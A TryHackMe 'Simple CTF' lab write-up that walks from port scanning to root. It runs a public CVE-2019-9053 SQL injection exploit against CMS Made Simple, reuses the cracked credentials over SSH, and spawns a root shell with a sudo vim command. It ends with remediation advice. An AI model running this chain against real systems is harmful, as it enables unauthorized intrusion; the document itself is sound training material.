# Simple CTF — TryHackMe — Easy — Web

**Date Completed:** 27 Sep 2026
**Time to Root:** ~45 minutes
**User Flag:** `mitch (SSH access via SQLi-extracted credentials)`
**Root Flag:** `W3ll d0n3. You made it!`

---

## Executive Summary

Simple CTF demonstrates a realistic outdated-CMS scenario: a website running CMS Made Simple 2.2.8, vulnerable to an unauthenticated time-based blind SQL injection (CVE-2019-9053), which leaked the administrator's credentials. Those same credentials were reused for SSH access, and a wide-open sudo rule allowing passwordless `vim` execution completed the chain to root — a textbook example of how one weak link (an outdated CMS) combined with password reuse and sudo misconfiguration compounds into full compromise.

---

## Scope and Methodology

- **Target IP:** 10.82.174.135
- **Platform:** TryHackMe
- **Category:** Web
- **Methodology:** Reconnaissance — Enumeration — Exploitation — Privilege Escalation

---

## Reconnaissance

### Port Scan

```bash
sudo nmap -sV -sC -p- -T4 10.82.174.135
```

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 21 | FTP | vsftpd 3.0.3 | Anonymous login allowed, not needed for this chain |
| 80 | HTTP | Apache 2.4.18 (Ubuntu) | Hosts CMS Made Simple, entry point |
| 2222 | SSH | OpenSSH 7.2p2 (Ubuntu) | Non-standard port; used post-exploitation |

---

## Enumeration

`robots.txt` disallowed an `/openemr-5_0_1_3` path (a red herring — no such directory actually existed), but directory enumeration with Gobuster revealed the real content root:

```bash
gobuster dir -u http://10.82.174.135 -w /usr/share/wordlists/dirb/common.txt
```

This found `/simple/`, hosting a live installation of **CMS Made Simple version 2.2.8** (version confirmed directly from the page footer).

```bash
searchsploit cms made simple 2.2.8
```

This confirmed a known unauthenticated SQL injection vulnerability affecting versions up to 2.2.9 (CVE-2019-9053).

---

## Exploitation

**Vulnerability Class:** Unauthenticated Time-Based Blind SQL Injection (CWE-89)

Retrieved the public exploit script and its dependencies:
```bash
searchsploit -m php/webapps/46635.py
```

The script (Python 2) targets `moduleinterface.php?mact=News,m1_,default,0` with a time-based blind SQLi payload to extract the administrator's username, password hash, and salt from the database one character at a time, based on measurable response delays.

```bash
python2 46635.py -u http://10.82.174.135/simple --crack -w /usr/share/wordlists/rockyou.txt
```

Result:

Username found: mitch
Email found: admin@admin.com
Password found: 0c01f4468bd75d7a84c7eb73846e8d96
Password cracked: secret


The cracked credentials (`mitch:secret`) were also valid for SSH, due to password reuse between the CMS admin account and the underlying system account:
```bash
ssh mitch@10.82.174.135 -p 2222
```

---

## Privilege Escalation

**Vulnerability Class:** Sudo Misconfiguration — Unrestricted Passwordless Binary (CWE-269)

Checked sudo permissions for the newly accessed `mitch` account:
```bash
sudo -l
```

Result:

User mitch may run the following commands on Machine:
(root) NOPASSWD: /usr/bin/vim


`vim` is a documented GTFOBins escalation vector: since it can execute arbitrary shell commands from within its editor interface, running it via sudo grants a fully privileged shell:
```bash
sudo vim -c ':!/bin/sh'
```

This immediately dropped into a root shell.

---

## Proof of Completion

W3ll d0n3. You made it!


---

## Vulnerability Analysis

| Finding | Severity | CVSS | MITRE ATT&CK | CWE |
|---------|----------|------|--------------|-----|
| Outdated CMS Made Simple with unauthenticated SQLi (CVE-2019-9053) | Critical | 9.8 | T1190 (Exploit Public-Facing Application) | CWE-89 |
| Credential reuse between CMS admin and system SSH account | High | 8.1 | T1078 (Valid Accounts) | CWE-521 |
| Sudo NOPASSWD rule for `vim` (GTFOBins escalation) | Critical | 8.8 | T1548.003 | CWE-269 |

---

## Remediation

1. **Update CMS Made Simple** to a patched version (2.2.10 or later) which fixes CVE-2019-9053, or migrate away from unmaintained/end-of-life CMS platforms entirely.
2. **Never reuse credentials across systems.** The CMS admin password should never also be valid for SSH access to the underlying host — a compromise of one should not compromise the other.
3. **Remove unnecessary sudo grants.** `vim` (and many other common utilities documented on GTFOBins) should never be grantable via passwordless sudo, since they can trivially spawn a privileged shell. Grant only the exact, minimal commands a user's role genuinely requires.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and service detection |
| Gobuster | Directory/content discovery |
| SearchSploit | Identifying the known CMS Made Simple SQLi exploit |
| Python 2 / requests | Running the public CVE-2019-9053 exploit script |
| SSH | Authenticated access using extracted credentials |

---

## Lessons Learned

- Outdated CMS installations remain one of the most common real-world findings on small business and legacy websites — checking the exact version against known CVEs should be a standard early step whenever a CMS footprint is identified.
- Password reuse between an application-layer account (CMS admin) and an OS-layer account (SSH) turns a web application vulnerability into full system access — a strong reminder to never share credentials across trust boundaries.
- `sudo -l` should be one of the very first commands run after obtaining any shell — GTFOBins (gtfobins.github.io) documents dozens of common binaries, including `vim`, `less`, `find`, and `awk`, that can be abused for privilege escalation the moment they appear in a sudoers entry.
